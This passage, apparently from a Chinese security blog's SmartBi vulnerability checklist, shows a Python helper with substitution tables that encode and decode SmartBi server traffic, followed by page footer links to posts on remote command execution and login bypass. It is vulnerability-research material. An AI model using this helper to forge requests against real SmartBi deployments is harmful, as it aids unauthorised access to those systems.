+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Z&#34;</span><span class="p">:</span> <span class="s2">&#34;U&#34;</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">:</span> <span class="s2">&#34;(&#34;</span><span class="p">,</span> <span class="s2">&#34;b&#34;</span><span class="p">:</span> <span class="s2">&#34;~&#34;</span><span class="p">,</span> <span class="s2">&#34;c&#34;</span><span class="p">:</span> <span class="s2">&#34;i&#34;</span><span class="p">,</span> <span class="s2">&#34;d&#34;</span><span class="p">:</span> <span class="s2">&#34;h&#34;</span><span class="p">,</span> <span class="s2">&#34;e&#34;</span><span class="p">:</span> <span class="s2">&#34;p&#34;</span><span class="p">,</span> <span class="s2">&#34;f&#34;</span><span class="p">:</span> <span class="s2">&#34;_&#34;</span><span class="p">,</span> <span class="s2">&#34;g&#34;</span><span class="p">:</span> <span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="s2">&#34;h&#34;</span><span class="p">:</span> <span class="s2">&#34;I&#34;</span><span class="p">,</span> <span class="s2">&#34;i&#34;</span><span class="p">:</span> <span class="s2">&#34;R&#34;</span><span class="p">,</span> <span class="s2">&#34;j&#34;</span><span class="p">:</span> <span class="s2">&#34;.&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;k&#34;</span><span class="p">:</span> <span class="s2">&#34;G&#34;</span><span class="p">,</span> <span class="s2">&#34;l&#34;</span><span class="p">:</span> <span class="s2">&#34;S&#34;</span><span class="p">,</span> <span class="s2">&#34;m&#34;</span><span class="p">:</span> <span class="s2">&#34;d&#34;</span><span class="p">,</span> <span class="s2">&#34;n&#34;</span><span class="p">:</span> <span class="s2">&#34;6&#34;</span><span class="p">,</span> <span class="s2">&#34;o&#34;</span><span class="p">:</span> <span class="s2">&#34;w&#34;</span><span class="p">,</span> <span class="s2">&#34;p&#34;</span><span class="p">:</span> <span class="s2">&#34;5&#34;</span><span class="p">,</span> <span class="s2">&#34;q&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">:</span> <span class="s2">&#34;4&#34;</span><span class="p">,</span> <span class="s2">&#34;s&#34;</span><span class="p">:</span> <span class="s2">&#34;D&#34;</span><span class="p">,</span> <span class="s2">&#34;t&#34;</span><span class="p">:</span> <span class="s2">&#34;k&#34;</span><span class="p">,</span> <span class="s2">&#34;u&#34;</span><span class="p">:</span> <span class="s2">&#34;Q&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;v&#34;</span><span class="p">:</span> <span class="s2">&#34;g&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">:</span> <span class="s2">&#34;b&#34;</span><span class="p">,</span> <span class="s2">&#34;x&#34;</span><span class="p">:</span> <span class="s2">&#34;C&#34;</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span><span class="p">:</span> <span class="s2">&#34;2&#34;</span><span class="p">,</span> <span class="s2">&#34;z&#34;</span><span class="p">:</span> <span class="s2">&#34;X&#34;</span><span class="p">,</span> <span class="s2">&#34;~&#34;</span><span class="p">:</span> <span class="s2">&#34;e&#34;</span><span class="p">,</span> <span class="s2">&#34;_&#34;</span><span class="p">:</span> <span class="s2">&#34;y&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">DECODING_SCHEDULE</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;7&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span> <span class="s2">&#34;u&#34;</span><span class="p">:</span> <span class="s2">&#34;2&#34;</span><span class="p">,</span> <span class="s2">&#34;N&#34;</span><span class="p">:</span> <span class="s2">&#34;3&#34;</span><span class="p">,</span> <span class="s2">&#34;K&#34;</span><span class="p">:</span> <span class="s2">&#34;4&#34;</span><span class="p">,</span> <span class="s2">&#34;J&#34;</span><span class="p">:</span> <span class="s2">&#34;5&#34;</span><span class="p">,</span> <span class="s2">&#34;M&#34;</span><span class="p">:</span> <span class="s2">&#34;6&#34;</span><span class="p">,</span> <span class="s2">&#34;9&#34;</span><span class="p">:</span> <span class="s2">&#34;7&#34;</span><span class="p">,</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">:</span> <span class="s2">&#34;8&#34;</span><span class="p">,</span> <span class="s2">&#34;m&#34;</span><span class="p">:</span> <span class="s2">&#34;9&#34;</span><span class="p">,</span> <span class="s2">&#34;P&#34;</span><span class="p">:</span> <span class="s2">&#34;!&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;/&#34;</span><span class="p">:</span> <span class="s2">&#34;%&#34;</span><span class="p">,</span> <span class="s2">&#34;n&#34;</span><span class="p">:</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="p">:</span> <span class="s2">&#34;(&#34;</span><span class="p">,</span> <span class="s2">&#34;E&#34;</span><span class="p">:</span> <span class="s2">&#34;)&#34;</span><span class="p">,</span> <span class="s2">&#34;s&#34;</span><span class="p">:</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span> <span class="s2">&#34;+&#34;</span><span class="p">:</span> <span class="s2">&#34;+&#34;</span><span class="p">,</span> <span class="s2">&#34;f&#34;</span><span class="p">:</span> <span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="s2">&#34;q&#34;</span><span class="p">:</span> <span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="s2">&#34;O&#34;</span><span class="p">:</span> <span class="s2">&#34;A&#34;</span><span class="p">,</span> <span class="s2">&#34;V&#34;</span><span class="p">:</span> <span class="s2">&#34;B&#34;</span><span class="p">,</span> <span class="s2">&#34;t&#34;</span><span class="p">:</span> <span class="s2">&#34;C&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;T&#34;</span><span class="p">:</span> <span class="s2">&#34;D&#34;</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">:</span> <span class="s2">&#34;E&#34;</span><span class="p">,</span> <span class="s2">&#34;x&#34;</span><span class="p">:</span> <span class="s2">&#34;F&#34;</span><span class="p">,</span> <span class="s2">&#34;H&#34;</span><span class="p">:</span> <span class="s2">&#34;G&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">:</span> <span class="s2">&#34;H&#34;</span><span class="p">,</span> <span class="s2">&#34;c&#34;</span><span class="p">:</span> <span class="s2">&#34;I&#34;</span><span class="p">,</span> <span class="s2">&#34;v&#34;</span><span class="p">:</span> <span class="s2">&#34;J&#34;</span><span class="p">,</span> <span class="s2">&#34;l&#34;</span><span class="p">:</span> <span class="s2">&#34;K&#34;</span><span class="p">,</span> <span class="s2">&#34;8&#34;</span><span class="p">:</span> <span class="s2">&#34;L&#34;</span><span class="p">,</span> <span class="s2">&#34;F&#34;</span><span class="p">:</span> <span class="s2">&#34;M&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">:</span> <span class="s2">&#34;N&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;o&#34;</span><span class="p">:</span> <span class="s2">&#34;O&#34;</span><span class="p">,</span> <span class="s2">&#34;L&#34;</span><span class="p">:</span> <span class="s2">&#34;P&#34;</span><span class="p">,</span> <span class="s2">&#34;Y&#34;</span><span class="p">:</span> <span class="s2">&#34;Q&#34;</span><span class="p">,</span> <span class="s2">&#34;j&#34;</span><span class="p">:</span> <span class="s2">&#34;R&#34;</span><span class="p">,</span> <span class="s2">&#34;W&#34;</span><span class="p">:</span> <span class="s2">&#34;S&#34;</span><span class="p">,</span> <span class="s2">&#34;*&#34;</span><span class="p">:</span> <span class="s2">&#34;T&#34;</span><span class="p">,</span> <span class="s2">&#34;z&#34;</span><span class="p">:</span> <span class="s2">&#34;U&#34;</span><span class="p">,</span> <span class="s2">&#34;Z&#34;</span><span class="p">:</span> <span class="s2">&#34;V&#34;</span><span class="p">,</span> <span class="s2">&#34;!&#34;</span><span class="p">:</span> <span class="s2">&#34;W&#34;</span><span class="p">,</span> <span class="s2">&#34;B&#34;</span><span class="p">:</span> <span class="s2">&#34;X&#34;</span><span class="p">,</span> <span class="s2">&#34;)&#34;</span><span class="p">:</span> <span class="s2">&#34;Y&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;U&#34;</span><span class="p">:</span> <span class="s2">&#34;Z&#34;</span><span class="p">,</span> <span class="s2">&#34;(&#34;</span><span class="p">:</span> <span class="s2">&#34;a&#34;</span><span class="p">,</span> <span class="s2">&#34;~&#34;</span><span class="p">:</span> <span class="s2">&#34;b&#34;</span><span class="p">,</span> <span class="s2">&#34;i&#34;</span><span class="p">:</span> <span class="s2">&#34;c&#34;</span><span class="p">,</span> <span class="s2">&#34;h&#34;</span><span class="p">:</span> <span class="s2">&#34;d&#34;</span><span class="p">,</span> <span class="s2">&#34;p&#34;</span><span class="p">:</span> <span class="s2">&#34;e&#34;</span><span class="p">,</span> <span class="s2">&#34;_&#34;</span><span class="p">:</span> <span class="s2">&#34;f&#34;</span><span class="p">,</span> <span class="s2">&#34;-&#34;</span><span class="p">:</span> <span class="s2">&#34;g&#34;</span><span class="p">,</span> <span class="s2">&#34;I&#34;</span><span class="p">:</span> <span class="s2">&#34;h&#34;</span><span class="p">,</span> <span class="s2">&#34;R&#34;</span><span class="p">:</span> <span class="s2">&#34;i&#34;</span><span class="p">,</span> <span class="s2">&#34;.&#34;</span><span class="p">:</span> <span class="s2">&#34;j&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;G&#34;</span><span class="p">:</span> <span class="s2">&#34;k&#34;</span><span class="p">,</span> <span class="s2">&#34;S&#34;</span><span class="p">:</span> <span class="s2">&#34;l&#34;</span><span class="p">,</span> <span class="s2">&#34;d&#34;</span><span class="p">:</span> <span class="s2">&#34;m&#34;</span><span class="p">,</span> <span class="s2">&#34;6&#34;</span><span class="p">:</span> <span class="s2">&#34;n&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">:</span> <span class="s2">&#34;o&#34;</span><span class="p">,</span> <span class="s2">&#34;5&#34;</span><span class="p">:</span> <span class="s2">&#34;p&#34;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">:</span> <span class="s2">&#34;q&#34;</span><span class="p">,</span> <span class="s2">&#34;4&#34;</span><span class="p">:</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span> <span class="s2">&#34;D&#34;</span><span class="p">:</span> <span class="s2">&#34;s&#34;</span><span class="p">,</span> <span class="s2">&#34;k&#34;</span><span class="p">:</span> <span class="s2">&#34;t&#34;</span><span class="p">,</span> <span class="s2">&#34;Q&#34;</span><span class="p">:</span> <span class="s2">&#34;u&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;g&#34;</span><span class="p">:</span> <span class="s2">&#34;v&#34;</span><span class="p">,</span> <span class="s2">&#34;b&#34;</span><span class="p">:</span> <span class="s2">&#34;w&#34;</span><span class="p">,</span> <span class="s2">&#34;C&#34;</span><span class="p">:</span> <span class="s2">&#34;x&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">:</span> <span class="s2">&#34;y&#34;</span><span class="p">,</span> <span class="s2">&#34;X&#34;</span><span class="p">:</span> <span class="s2">&#34;z&#34;</span><span class="p">,</span> <span class="s2">&#34;e&#34;</span><span class="p">:</span> <span class="s2">&#34;~&#34;</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span><span class="p">:</span> <span class="s2">&#34;_&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#此函数可以用来加密明文也可以解密服务器返回的密文</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">out</span> <span class="o">=</span> <span class="n">out</span> <span class="o">+</span> <span class="n">ENCODING_SCHEDULE</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">item</span><span class="p">,</span> <span class="n">item</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">out</span> <span class="o">=</span> <span class="n">out</span> <span class="o">+</span> <span class="n">DECODING_SCHEDULE</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">item</span><span class="p">,</span> <span class="n">item</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;read.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">decode</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="n">encode</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Input:     &#39;</span> <span class="o">+</span> <span class="n">a</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;decode:    &#39;</span> <span class="o">+</span> <span class="n">b</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;decode-unquote-url:   &#39;</span><span class="o">+</span><span class="n">unquote</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;encode:   &#39;</span><span class="o">+</span><span class="n">c</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注：加密和解密的过程就是替换字符的过程，最终解密得到的是 url 编码，加密时传入的文本也要是 url 编码。</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/smartbi-%E6%BC%8F%E6%B4%9E-checklist/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/smartbi-%E6%BC%8F%E6%B4%9E-checklist/" data-title="SmartBi 漏洞 Checklist" data-via="xxxx" data-hashtags="漏洞知识库"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/smartbi-%E6%BC%8F%E6%B4%9E-checklist/" data-hashtag="漏洞知识库"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/smartbi-%E6%BC%8F%E6%B4%9E-checklist/" data-title="SmartBi 漏洞 Checklist"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/smartbi-%E6%BC%8F%E6%B4%9E-checklist/" data-title="SmartBi 漏洞 Checklist"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/smartbi-%E6%BC%8F%E6%B4%9E-checklist/" data-title="SmartBi 漏洞 Checklist"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/smartbi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="prev" rel="prev" title="Smartbi 远程命令执行漏洞"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Smartbi 远程命令执行漏洞</a>
+            <a href="/smartbi-rmiservlet-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="next" rel="next" title="Smartbi RMIServlet 登陆绕过漏洞">Smartbi RMIServlet 登陆绕过漏洞<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Chinchin</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"首页","id-2":"首页"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
